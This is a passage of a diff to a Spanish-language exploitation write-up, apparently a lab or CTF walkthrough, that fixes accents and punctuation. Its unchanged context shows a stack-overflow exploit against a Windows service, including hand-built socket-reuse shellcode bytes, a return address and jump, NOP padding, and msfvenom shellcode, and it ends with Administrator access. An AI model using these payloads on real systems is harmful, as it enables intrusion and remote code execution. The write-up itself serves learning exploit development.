-Segui con las *flags*, este valor tenia `0x00000000`, podia usar *EBX* para almacenarlo, hice un `xor` a `ebx` ya que da como resultado 0 y tambien le hice un `push` a *EBX* para apilarlo al final.
+Seguí con las *flags*, este valor tenía `0x00000000`, podía usar *EBX* para almacenarlo, hice un `xor` a `ebx` porque da como resultado 0 y también le hice un `push` a *EBX* para apilarlo al final.
 
 ![image](https://camo.githubusercontent.com/18e173f11ab4a482c711010899765142fc08c9a520c8bcb04f16331f94ff2391/68747470733a2f2f696d6775722e636f6d2f6c5276424c61652e706e67)
 ![image](https://user-images.githubusercontent.com/69093629/158069004-859a1247-80bd-4350-a519-10eb2e71539d.png)
   
-Ahora simplemente podia sumar a *EBX* 410 *bytes* para hacer la longitud ya que vale 0 y volver a hacer un `push` a *EBX* para apilar la longitud al final de la pila.
+Ahora simplemente podía sumar a *EBX* 410 *bytes* para hacer la longitud, ya que vale 0 y volver a hacer un `push` a *EBX* para apilar la longitud al final de la pila.
 
 ![image](https://camo.githubusercontent.com/7fa632f856ba659e084e99a805d0cd3c3df2c746dbbd723c5b339a43a0c8347b/68747470733a2f2f696d6775722e636f6d2f324a595a676c732e706e67)
 
 ![image](https://user-images.githubusercontent.com/69093629/158069237-bcd5bae8-5aa8-4d10-8782-77974a5c79ea.png)
  
-Asi estaba quedando el *exploit*.
+Así estaba quedando el *exploit*.
 
 ```python
 recv = b""
@@ -590,20 +590,20 @@ recv += b"\x53" 				# -> push ebx
 payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
 ```
 
-Ya que habia restado 70 *bytes* en el *ESP*, hice que *EBX* tenga el valor de *ESP* para volver a sumar 70 *bytes* a *EBX* y caer en un punto intermedio donde estan mis A, ahi pondre NOPS para que siga el flujo del programa sin problemas hasta *EBX* que estara apuntando a la funcion de *socket* `recv`, la cual contendra suficiente espacio para almacenar el *shellcode*.
+Ya que había restado 70 *bytes* en el *ESP*, hice que *EBX* tenga el valor de *ESP* para volver a sumar 70 *bytes* a *EBX* y caer en un punto intermedio donde están mis A, ahí pondré NOPS para que siga el flujo del programa sin problemas hasta *EBX* que estará apuntando a la función de *socket* `recv`, la cual contendrá suficiente espacio para almacenar el *shellcode*.
 
 ![image](https://camo.githubusercontent.com/6651c05abecefe0cbf059369452cf60482f710663713130d10c1c003d717f44d/68747470733a2f2f696d6775722e636f6d2f4b3975394e50552e706e67)
 ![image](https://camo.githubusercontent.com/e7dc879292922fb5ebb1d8a4c76ef811f6a5cbaffeb044edc132c73faeefa7cf/68747470733a2f2f696d6775722e636f6d2f374d324835366b2e706e67)
  
-*EBX* ya tenia la misma direccion que *ESP*.
+*EBX* ya tenía la misma dirección que *ESP*.
  
 ![image](https://user-images.githubusercontent.com/69093629/158069787-a0f86e9f-4b23-4322-9531-2a4c6e9400ff.png)
  
-Hice un `Step Info` y se aplico la suma de los 70 *bytes*, por lo que *EBX* ya estaba en un punto intermedio de las A.
+Hice un `Step Info` y se aplicó la suma de los 70 *bytes*, por lo que *EBX* ya estaba en un punto intermedio de las A.
 
 ![image](https://user-images.githubusercontent.com/69093629/158069800-9f65129c-07de-4226-abe7-9ca123a0553e.png)
   
-El *exploit* estaba quedando asi:
+El *exploit* estaba quedando así:
 
 ```python
 recv = b""
@@ -624,7 +624,7 @@ recv += b"\x53"					# -> push ebx
 
 payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
 ```
-Ahora simplemente hice un `push ebx` que contenia el *bufer* y un `push esi` que contenia el descriptor del *socket*.
+Ahora simplemente hice un `push ebx` que contenía el *bufer* y un `push esi` que contenía el descriptor del *socket*.
 
 ![image](https://camo.githubusercontent.com/d636659a35f69f53c2bb322cb29c2ecd9341b90ca4a66daa2e8eac6fe6231e3b/68747470733a2f2f696d6775722e636f6d2f506e5a416d4c5a2e706e67)
  
@@ -632,15 +632,15 @@ Ejecuto el *exploit* con los nuevos valores y este fue el resultado:
 
 ![image](https://user-images.githubusercontent.com/69093629/158071328-48556507-c6ff-409a-8d34-4f81b018276b.png)
  
-Perfecto!, ya tenia todos los valores correspondientes adecuados al *socket*, lo que unico que faltaba era hacer la llamada, por lo cual necesitaba la direccion del *socket*, este lo extraje de `ghidra`.
+Perfecto!, ya tenía todos los valores correspondientes adecuados al *socket*, lo que único que faltaba era hacer la llamada, por lo cual necesitaba la dirección del *socket*, este lo extraje de `ghidra`.
  
 ![image](https://camo.githubusercontent.com/f1e10cc2ed963a914acd3f9c149da295fdfcf14b55c7dbc33b50194e3616903a/68747470733a2f2f696d6775722e636f6d2f74457a547946692e706e67)
   
-Esta direccion la puse en *EAX* con `mov eax, [0x719082ac]` y hice una llamada a *EAX*.
+Esta direcció la puse en *EAX* con `mov eax, [0x719082ac]` e hice una llamada a *EAX*.
 
 ![image](https://camo.githubusercontent.com/8f6c8bc1fd2b505f32ba4d2d7272e84cf2deb3938c00554871402cd3eea4c035/68747470733a2f2f696d6775722e636f6d2f36346d566375312e706e67)
 
-Converti las A en NOPS y este es el aspecto que tenia el *exploit*.
+Converti las A en NOPS y este es el aspecto que tenía el *exploit*.
 
 ```python
 recv = b""
@@ -669,7 +669,7 @@ Ahora simplemente cree mi *shellcode* con `msfvenom`.
 
 ![image](https://camo.githubusercontent.com/3bc13d9861696a4ed9d61b9acfb22ea4d97183eb5f149ba2111de6925d7d8396/68747470733a2f2f696d6775722e636f6d2f4259316434656c2e706e67)
  
-Lo introduje en el *exploit* y asi quedo entero.
+Lo introduje en el *exploit* y así quedo entero.
 
 ```python
 #!/usr/bin/python3
@@ -764,7 +764,7 @@ if __name__ == '__main__':
 	main()
 ```
  
-Simplemente lo ejecute y gane acceso como Administrator.
+Simplemente, lo ejecute y gane acceso como Administrador
  
 ![image](https://camo.githubusercontent.com/e7373458ff66365c24a17f8bf2f8f770351051d433d22b9e3def4456b75bdfc7/68747470733a2f2f696d6775722e636f6d2f32774b766a7a752e706e67)
   
